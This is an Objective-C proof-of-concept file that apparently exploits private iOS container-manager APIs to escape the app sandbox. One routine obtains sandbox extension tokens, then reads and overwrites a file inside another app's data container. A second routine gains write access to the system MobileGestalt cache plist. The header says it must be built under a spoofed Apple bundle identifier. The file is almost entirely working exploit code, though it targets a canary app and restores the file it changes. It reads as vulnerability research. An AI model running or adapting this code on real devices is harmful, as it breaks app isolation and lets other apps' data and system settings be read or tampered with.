/*
 * Minimal MobileHouseArrest container escape and class-13 MobileGestalt PoC.
 *
 * Build this file in an iOS app whose CodeDirectory identifier is exactly:
 *     com.apple.mobile.MobileHouseArrest
 *
 * Install and open SandboxCanaryVictim before the MobileHouseArrest test.
 * The class-13 test uses the fixed MobileGestalt cache path.
 */

#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <errno.h>
#import <fcntl.h>
#import <stdbool.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>

typedef void *container_query_t;
typedef void *container_object_t;

static BOOL CanOpen(NSString *path)
{
    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_CLOEXEC);
    if (fd < 0) {
        return NO;
    }
    close(fd);
    return YES;
}

static BOOL CanOpenReadWrite(NSString *path)
{
    int fd = open(path.fileSystemRepresentation,
                  O_RDWR | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) {
        return NO;
    }
    close(fd);
    return YES;
}

static NSString *NormalizePath(NSString *path)
{
    NSString *result = path.stringByStandardizingPath;
    if ([result isEqualToString:@"/var"] || [result hasPrefix:@"/var/"]) {
        result = [@"/private" stringByAppendingString:result];
    }
    return result;
}

int run_mobilehousearrest_poc(void)
{
    void *lib = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL);
    if (lib == NULL) {
        return 1;
    }

    container_query_t (*query_create)(void) =
        dlsym(lib, "container_query_create");
    void (*query_set_class)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_set_class");
    void (*query_set_ids)(container_query_t, xpc_object_t) =
        dlsym(lib, "container_query_set_identifiers");
    void (*query_set_flags)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_flags");
    void (*query_set_part)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_part");
    container_object_t (*query_result)(container_query_t) =
        dlsym(lib, "container_query_get_single_result");
    void (*query_free)(container_query_t) =
        dlsym(lib, "container_query_free");
    container_object_t (*object_copy)(container_object_t) =
        dlsym(lib, "container_object_copy");
    void (*object_free)(container_object_t) =
        dlsym(lib, "container_object_free");
    const char *(*object_path)(container_object_t) =
        dlsym(lib, "container_object_get_path");
    char *(*copy_token)(container_object_t) =
        dlsym(lib, "container_copy_sandbox_token");
    bool (*activate)(container_object_t, bool) =
        dlsym(lib, "container_object_sandbox_extension_activate");

    if (query_create == NULL || query_set_class == NULL ||
        query_set_ids == NULL || query_set_flags == NULL ||
        query_set_part == NULL || query_result == NULL ||
        query_free == NULL || object_copy == NULL || object_free == NULL ||
        object_path == NULL || copy_token == NULL || activate == NULL) {
        dlclose(lib);
        return 2;
    }

    container_query_t query = query_create();
    if (query == NULL) {
        dlclose(lib);
        return 3;
    }
    query_set_class(query, 2);                  // app-data container
    query_set_flags(query, UINT64_C(0x900000000));
    query_set_part(query, 0);

    xpc_object_t ids = xpc_array_create(NULL, 0);
    xpc_array_set_string(ids, XPC_ARRAY_APPEND,
                         "local.research.SandboxCanaryVictim");
    query_set_ids(query, ids);
#if !OS_OBJECT_USE_OBJC
    xpc_release(ids);
#endif

    container_object_t borrowed = query_result(query);
    container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
    if (object == NULL) {
        query_free(query);
        dlclose(lib);
        return 4;                               // patched or victim missing
    }

    NSString *root = [NSString stringWithUTF8String:object_path(object)];
    NSString *canary = [root stringByAppendingPathComponent:
        @"Documents/sbescape-canary.txt"];
    BOOL deniedBefore = !CanOpen(canary);

    char *token = copy_token(object);
    BOOL tokenPresent = token != NULL && token[0] != '\0';
    free(token);
    BOOL activated = tokenPresent && activate(object, false);

    NSData *original = activated ? [NSData dataWithContentsOfFile:canary] : nil;
    NSData *changed = [@"MobileHouseArrest PoC\n"
        dataUsingEncoding:NSUTF8StringEncoding];
    BOOL wrote = original != nil &&
        [changed writeToFile:canary atomically:NO];
    BOOL changedReadBack = wrote &&
        [[NSData dataWithContentsOfFile:canary] isEqualToData:changed];
    BOOL restored = original != nil &&
        [original writeToFile:canary atomically:NO] &&
        [[NSData dataWithContentsOfFile:canary] isEqualToData:original];

    object_free(object);                       // revokes the extension
    query_free(query);
    BOOL deniedAfter = !CanOpen(canary);
    dlclose(lib);

    BOOL success = deniedBefore && activated && changedReadBack &&
        restored && deniedAfter;
    fprintf(stderr,
        "MHA success=%d path=%s activated=%d restored=%d post_denied=%d\n",
        success, canary.UTF8String, activated, restored, deniedAfter);
    return success ? 0 : 5;
}

int run_mobilegestalt_class13_poc(void)
{
    static NSString *const expectedRoot =
        @"/private/var/containers/Shared/SystemGroup/"
         "systemgroup.com.apple.mobilegestaltcache/Library/Caches";

    void *lib = dlopen(
        "/usr/lib/system/libsystem_containermanager.dylib",
        RTLD_NOW | RTLD_LOCAL);
    if (lib == NULL) {
        return 1;
    }

    container_query_t (*query_create)(void) =
        dlsym(lib, "container_query_create");
    void (*query_set_class)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_set_class");
    void (*query_set_group_ids)(container_query_t, xpc_object_t) =
        dlsym(lib, "container_query_set_group_identifiers");
    void (*query_set_flags)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_flags");
    void (*query_set_part)(container_query_t, uint64_t) =
        dlsym(lib, "container_query_operation_set_part");
    container_object_t (*query_result)(container_query_t) =
        dlsym(lib, "container_query_get_single_result");
    void (*query_free)(container_query_t) =
        dlsym(lib, "container_query_free");
    container_object_t (*object_copy)(container_object_t) =
        dlsym(lib, "container_object_copy");
    void (*object_free)(container_object_t) =
        dlsym(lib, "container_object_free");
    const char *(*object_path)(container_object_t) =
        dlsym(lib, "container_object_get_path");
    char *(*copy_token)(container_object_t) =
        dlsym(lib, "container_copy_sandbox_token");
    bool (*activate)(container_object_t, bool) =
        dlsym(lib, "container_object_sandbox_extension_activate");

    if (query_create == NULL || query_set_class == NULL ||
        query_set_group_ids == NULL || query_set_flags == NULL ||
        query_set_part == NULL || query_result == NULL ||
        query_free == NULL || object_copy == NULL || object_free == NULL ||
        object_path == NULL || copy_token == NULL || activate == NULL) {
        dlclose(lib);
        return 2;
    }

    container_query_t query = query_create();
    if (query == NULL) {
        dlclose(lib);
        return 3;
    }
    query_set_class(query, 13);                 // system-group container
    xpc_object_t groups = xpc_array_create(NULL, 0);
    xpc_array_set_string(groups, XPC_ARRAY_APPEND,
        "systemgroup.com.apple.mobilegestaltcache");
    query_set_group_ids(query, groups);
#if !OS_OBJECT_USE_OBJC
    xpc_release(groups);
#endif
    query_set_flags(query, UINT64_C(0x8100000000));
    query_set_part(query, 3);                   // Library/Caches

    container_object_t borrowed = query_result(query);
    container_object_t object = borrowed != NULL ? object_copy(borrowed) : NULL;
    if (object == NULL) {
        query_free(query);
        dlclose(lib);
        return 4;
    }

    const char *rawPath = object_path(object);
    NSString *returnedPath = rawPath != NULL
        ? [NSString stringWithUTF8String:rawPath] : nil;
    NSString *resolvedPath = NormalizePath(returnedPath ?: @"");
    BOOL exactRoot = [resolvedPath isEqualToString:expectedRoot];
    NSString *plist = [expectedRoot stringByAppendingPathComponent:
        @"com.apple.MobileGestalt.plist"];
    BOOL deniedBefore = !CanOpenReadWrite(plist);

    char *token = exactRoot ? copy_token(object) : NULL;
    BOOL tokenPresent = token != NULL && token[0] != '\0';
    free(token);
    BOOL activated = tokenPresent && activate(object, false);
    BOOL writable = activated && CanOpenReadWrite(plist);

    object_free(object);                        // revokes the extension
    query_free(query);
    BOOL deniedAfter = !CanOpenReadWrite(plist);
    dlclose(lib);

    BOOL success = exactRoot && deniedBefore && activated && writable &&
        deniedAfter;
    fprintf(stderr,
        "MG_CLASS13 success=%d root=%s activated=%d writable=%d "
        "post_denied=%d\n",
        success, resolvedPath.UTF8String ?: "(null)", activated, writable,
        deniedAfter);
    return success ? 0 : 5;
}
